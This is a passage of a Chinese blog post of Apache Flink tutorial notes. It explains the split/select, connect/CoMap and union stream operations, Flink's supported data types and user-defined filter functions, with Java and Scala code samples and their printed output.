class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.apitest.transform;<span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2018-2028 尚硅谷 All Rights Reserved</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Project: FlinkTutorial</span></span><br><span class="line"><span class="comment"> * Package: com.atguigu.apitest.transform</span></span><br><span class="line"><span class="comment"> * Version: 1.0</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Created by wushengran on 2020/11/7 16:14</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.atguigu.apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.MapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple3;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.collector.selector.OutputSelector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.ConnectedStreams;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SplitStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.co.CoMapFunction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ClassName</span>: TransformTest4_MultipleStreams</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>:</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: wushengran on 2020/11/7 16:14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformTest4_MultipleStreams</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从文件读取数据</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;D:\\Projects\\BigData\\FlinkTutorial\\src\\main\\resources\\sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换成SensorReading</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125; );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 分流，按照温度值30度为界分为两条流</span></span><br><span class="line">    SplitStream&lt;SensorReading&gt; splitStream = dataStream.split(<span class="keyword">new</span> OutputSelector&lt;SensorReading&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> Iterable&lt;String&gt; <span class="title">select</span><span class="params">(SensorReading value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (value.getTemperature() &gt; <span class="number">30</span>) ? Collections.singletonList(<span class="string">&quot;high&quot;</span>) : Collections.singletonList(<span class="string">&quot;low&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    DataStream&lt;SensorReading&gt; highTempStream = splitStream.select(<span class="string">&quot;high&quot;</span>);</span><br><span class="line">    DataStream&lt;SensorReading&gt; lowTempStream = splitStream.select(<span class="string">&quot;low&quot;</span>);</span><br><span class="line">    DataStream&lt;SensorReading&gt; allTempStream = splitStream.select(<span class="string">&quot;high&quot;</span>, <span class="string">&quot;low&quot;</span>);</span><br><span class="line"></span><br><span class="line">    highTempStream.print(<span class="string">&quot;high&quot;</span>);</span><br><span class="line">    lowTempStream.print(<span class="string">&quot;low&quot;</span>);</span><br><span class="line">    allTempStream.print(<span class="string">&quot;all&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">high&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718199, temperature=35.8&#125;</span></span><br><span class="line">all &gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718199, temperature=35.8&#125;</span><br><span class="line">low &gt; SensorReading&#123;id=&#x27;sensor_6&#x27;, timestamp=1547718201, temperature=15.4&#125;</span><br><span class="line">all &gt; SensorReading&#123;id=&#x27;sensor_6&#x27;, timestamp=1547718201, temperature=15.4&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h6 id="Connect和CoMap"><a href="#Connect和CoMap" class="headerlink" title="Connect和CoMap"></a>Connect和CoMap</h6><p>####### Connect</p><p><img src="https://img-blog.csdnimg.cn/20200902202832986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=aMFhA&originHeight=287&originWidth=732&originalType=binary&ratio=1&status=done&style=none"><br><strong>DataStream,DataStream -&gt; ConnectedStreams</strong>: 连接两个保持他们类型的数据流，两个数据流被Connect 之后，只是被放在了一个流中，内部依然保持各自的数据和形式不发生任何变化，两个流相互独立。</p><p>####### CoMap</p><p><img src="https://img-blog.csdnimg.cn/20200902203333640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=hudRR&originHeight=267&originWidth=602&originalType=binary&ratio=1&status=done&style=none"><br><strong>ConnectedStreams -&gt; DataStream</strong>: 作用于ConnectedStreams 上，功能与map和flatMap一样，对ConnectedStreams 中的<strong>每一个Stream分别进行map和flatMap操作</strong>；</p><hr><p>虽然Flink1.12.1的DataStream有connect和map方法，但是教程基于前面的split和select编写，所以这里直接附上教程的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.apitest.transform;<span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2018-2028 尚硅谷 All Rights Reserved</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Project: FlinkTutorial</span></span><br><span class="line"><span class="comment"> * Package: com.atguigu.apitest.transform</span></span><br><span class="line"><span class="comment"> * Version: 1.0</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Created by wushengran on 2020/11/7 16:14</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.atguigu.apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.MapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple3;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.collector.selector.OutputSelector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.ConnectedStreams;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SplitStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.co.CoMapFunction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ClassName</span>: TransformTest4_MultipleStreams</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>:</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: wushengran on 2020/11/7 16:14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformTest4_MultipleStreams</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从文件读取数据</span></span><br><span class="line">        DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;D:\\Projects\\BigData\\FlinkTutorial\\src\\main\\resources\\sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 转换成SensorReading</span></span><br><span class="line">        DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">            String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">        &#125; );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 分流，按照温度值30度为界分为两条流</span></span><br><span class="line">        SplitStream&lt;SensorReading&gt; splitStream = dataStream.split(<span class="keyword">new</span> OutputSelector&lt;SensorReading&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Iterable&lt;String&gt; <span class="title">select</span><span class="params">(SensorReading value)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> (value.getTemperature() &gt; <span class="number">30</span>) ? Collections.singletonList(<span class="string">&quot;high&quot;</span>) : Collections.singletonList(<span class="string">&quot;low&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        DataStream&lt;SensorReading&gt; highTempStream = splitStream.select(<span class="string">&quot;high&quot;</span>);</span><br><span class="line">        DataStream&lt;SensorReading&gt; lowTempStream = splitStream.select(<span class="string">&quot;low&quot;</span>);</span><br><span class="line">        DataStream&lt;SensorReading&gt; allTempStream = splitStream.select(<span class="string">&quot;high&quot;</span>, <span class="string">&quot;low&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// highTempStream.print(&quot;high&quot;);</span></span><br><span class="line">        <span class="comment">// lowTempStream.print(&quot;low&quot;);</span></span><br><span class="line">        <span class="comment">// allTempStream.print(&quot;all&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 合流 connect，将高温流转换成二元组类型，与低温流连接合并之后，输出状态信息</span></span><br><span class="line">        DataStream&lt;Tuple2&lt;String, Double&gt;&gt; warningStream = highTempStream.map(<span class="keyword">new</span> MapFunction&lt;SensorReading, Tuple2&lt;String, Double&gt;&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Tuple2&lt;String, Double&gt; <span class="title">map</span><span class="params">(SensorReading value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(value.getId(), value.getTemperature());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        ConnectedStreams&lt;Tuple2&lt;String, Double&gt;, SensorReading&gt; connectedStreams = warningStream.connect(lowTempStream);</span><br><span class="line"></span><br><span class="line">        DataStream&lt;Object&gt; resultStream = connectedStreams.map(<span class="keyword">new</span> CoMapFunction&lt;Tuple2&lt;String, Double&gt;, SensorReading, Object&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">map1</span><span class="params">(Tuple2&lt;String, Double&gt; value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Tuple3&lt;&gt;(value.f0, value.f1, <span class="string">&quot;high temp warning&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">map2</span><span class="params">(SensorReading value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(value.getId(), <span class="string">&quot;normal&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        resultStream.print();</span><br><span class="line">        </span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(sensor_1,35.8,high temp warning)</span><br><span class="line">(sensor_6,normal)</span><br><span class="line">(sensor_10,38.1,high temp warning)</span><br><span class="line">(sensor_7,normal)</span><br><span class="line">(sensor_1,36.3,high temp warning)</span><br><span class="line">(sensor_1,32.8,high temp warning)</span><br><span class="line">(sensor_1,37.1,high temp warning)</span><br></pre></td></tr></table></figure><h6 id="Union"><a href="#Union" class="headerlink" title="Union"></a>Union</h6><p><img src="https://img-blog.csdnimg.cn/20200902205220165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=XfxZV&originHeight=297&originWidth=646&originalType=binary&ratio=1&status=done&style=none"></p><p><strong>DataStream -&gt; DataStream</strong>：对<strong>两个或者两个以上</strong>的DataStream进行Union操作，产生一个包含多有DataStream元素的新DataStream。</p><p><strong>问题：和Connect的区别？</strong></p><ol><li>Connect 的数据类型可以不同，<strong>Connect 只能合并两个流</strong>；</li><li><strong>Union可以合并多条流，Union的数据结构必须是一样的</strong>；</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3. union联合多条流</span></span><br><span class="line"><span class="comment">//        warningStream.union(lowTempStream); 这个不行，因为warningStream类型是DataStream&lt;Tuple2&lt;String, Double&gt;&gt;，而highTempStream是DataStream&lt;SensorReading&gt;</span></span><br><span class="line">        highTempStream.union(lowTempStream, allTempStream);</span><br></pre></td></tr></table></figure><h5 id="算子转换"><a href="#算子转换" class="headerlink" title="算子转换"></a>算子转换</h5><blockquote><p><a href="https://blog.csdn.net/a_drjiaoda/article/details/89357916">Flink常用算子Transformation（转换）</a></p></blockquote><pre><code>在Storm中，我们常常用Bolt的层级关系来表示各个数据的流向关系，组成一个拓扑。在Flink中，**Transformation算子就是将一个或多个DataStream转换为新的DataStream**，可以将多个转换组合成复杂的数据流拓扑。如下图所示，DataStream会由不同的Transformation操作，转换、过滤、聚合成其他不同的流，从而完成我们的业务要求。</code></pre><p><img src="https://img-blog.csdnimg.cn/20190417171341810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FfZHJqaWFvZGE=,size_16,color_FFFFFF,t_70###id=XEJKu&originHeight=475&originWidth=839&originalType=binary&ratio=1&status=done&style=none"></p><h4 id="支持的数据类型"><a href="#支持的数据类型" class="headerlink" title="支持的数据类型"></a>支持的数据类型</h4><pre><code>Flink流应用程序处理的是以数据对象表示的事件流。所以在Flink内部，我们需要能够处理这些对象。它们**需要被序列化和反序列化**，以便通过网络传送它们；或者从状态后端、检查点和保存点读取它们。为了有效地做到这一点，Flink需要明确知道应用程序所处理的数据类型。Flink使用类型信息的概念来表示数据类型，并为每个数据类型生成特定的序列化器、反序列化器和比较器。Flink还具有一个类型提取系统，该系统分析函数的输入和返回类型，以自动获取类型信息，从而获得序列化器和反序列化器。但是，在某些情况下，例如lambda函数或泛型类型，需要显式地提供类型信息，才能使应用程序正常工作或提高其性能。Flink支持Java和Scala中所有常见数据类型。使用最广泛的类型有以下几种。</code></pre><h5 id="基础数据类型"><a href="#基础数据类型" class="headerlink" title="基础数据类型"></a>基础数据类型</h5><pre><code>Flink支持所有的Java和Scala基础数据类型，Int, Double, Long, String, …</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;Integer&gt; numberStream = env.fromElements(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">numberStream.map(data -&gt; data * <span class="number">2</span>);</span><br></pre></td></tr></table></figure><h5 id="Java和Scala元组-Tuples"><a href="#Java和Scala元组-Tuples" class="headerlink" title="Java和Scala元组(Tuples)"></a>Java和Scala元组(Tuples)</h5><p>java不像Scala天生支持元组Tuple类型，java的元组类型由Flink的包提供，默认提供Tuple0~Tuple25</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;Tuple2&lt;String, Integer&gt;&gt; personStream = env.fromElements( </span><br><span class="line">  <span class="keyword">new</span> Tuple2(<span class="string">&quot;Adam&quot;</span>, <span class="number">17</span>), </span><br><span class="line">  <span class="keyword">new</span> Tuple2(<span class="string">&quot;Sarah&quot;</span>, <span class="number">23</span>) </span><br><span class="line">); </span><br><span class="line">personStream.filter(p -&gt; p.f1 &gt; <span class="number">18</span>);</span><br></pre></td></tr></table></figure><h5 id="Scala样例类-case-classes"><a href="#Scala样例类-case-classes" class="headerlink" title="Scala样例类(case classes)"></a>Scala样例类(case classes)</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span>(<span class="params">name:<span class="type">String</span>,age:<span class="type">Int</span></span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> numbers: <span class="type">DataStream</span>[(<span class="type">String</span>,<span class="type">Integer</span>)] = env.fromElements(</span><br><span class="line">  <span class="type">Person</span>(<span class="string">&quot;张三&quot;</span>,<span class="number">12</span>),</span><br><span class="line">  <span class="type">Person</span>(<span class="string">&quot;李四&quot;</span>，<span class="number">23</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h5 id="Java简单对象-POJO"><a href="#Java简单对象-POJO" class="headerlink" title="Java简单对象(POJO)"></a>Java简单对象(POJO)</h5><p>java的POJO这里要求必须提供无参构造函数</p><ul><li>成员变量要求都是public（或者private但是提供get、set方法）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> String name;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">( String name , <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">DataStream Pe rson &gt; persons = env.fromElements(</span><br><span class="line">  <span class="keyword">new</span> Person (<span class="string">&quot; Alex&quot;</span>, <span class="number">42</span>),</span><br><span class="line">  <span class="keyword">new</span> Person (<span class="string">&quot; Wendy&quot;</span>,<span class="number">23</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h5 id="其他-Arrays-Lists-Maps-Enums-等等"><a href="#其他-Arrays-Lists-Maps-Enums-等等" class="headerlink" title="其他(Arrays, Lists, Maps, Enums,等等)"></a>其他(Arrays, Lists, Maps, Enums,等等)</h5><p>Flink对Java和Scala中的一些特殊目的的类型也都是支持的，比如Java的ArrayList，HashMap，Enum等等。</p><h4 id="实现UDF函数——更细粒度的控制流"><a href="#实现UDF函数——更细粒度的控制流" class="headerlink" title="实现UDF函数——更细粒度的控制流"></a>实现UDF函数——更细粒度的控制流</h4><h5 id="函数类-Function-Classes"><a href="#函数类-Function-Classes" class="headerlink" title="函数类(Function Classes)"></a>函数类(Function Classes)</h5><pre><code>Flink暴露了所有UDF函数的接口(实现方式为接口或者抽象类)。例如MapFunction, FilterFunction, ProcessFunction等等。下面例子实现了FilterFunction接口：</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;String&gt; flinkTweets = tweets.filter(<span class="keyword">new</span> FlinkFilter()); </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">FlinkFilter</span> <span class="keyword">implements</span> <span class="title">FilterFunction</span>&lt;<span class="title">String</span>&gt; </span>&#123; </span><br><span class="line">  <span class="meta">@Override</span> <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(String value)</span> <span class="keyword">throws</span> Exception </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> value.contains(<span class="string">&quot;flink&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>还可以将函数实现成匿名类</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;String&gt; flinkTweets = tweets.filter(</span><br><span class="line">  <span class="keyword">new</span> FilterFunction&lt;String&gt;() &#123; </span><br><span class="line">    <span class="meta">@Override</span> <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(String value)</span> <span class="keyword">throws</span> Exception </span>&#123; </span><br><span class="line">      <span class="keyword">return</span> value.contains(<span class="string">&quot;flink&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><pre><code>我们filter的字符串&quot;flink&quot;还可以当作参数传进去。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;String&gt; tweets = env.readTextFile(<span class="string">&quot;INPUT_FILE &quot;</span>); </span><br><span class="line">DataStream&lt;String&gt; flinkTweets = tweets.filter(<span class="keyword">new</span> KeyWordFilter(<span class="string">&quot;flink&quot;</span>)); </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">KeyWordFilter</span> <span class="keyword">implements</span> <span class="title">FilterFunction</span>&lt;<span class="title">String</span>&gt; </span>&#123; </span><br><span class="line">  <span class="keyword">private</span> String keyWord; </span><br><span class="line"></span><br><span class="line">  KeyWordFilter(String keyWord) &#123; </span><br><span class="line">    <span class="keyword">this</span>.keyWord = keyWord; </span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span> <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(String value)</span> <span class="keyword">throws</span> Exception </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> value.contains(<span class="keyword">this</span>.keyWord); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="匿名函数-Lambda-Functions"><a href="#匿名函数-Lambda-Functions" class="headerlink" title="匿名函数(Lambda Functions)"></a>匿名函数(Lambda Functions)</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span 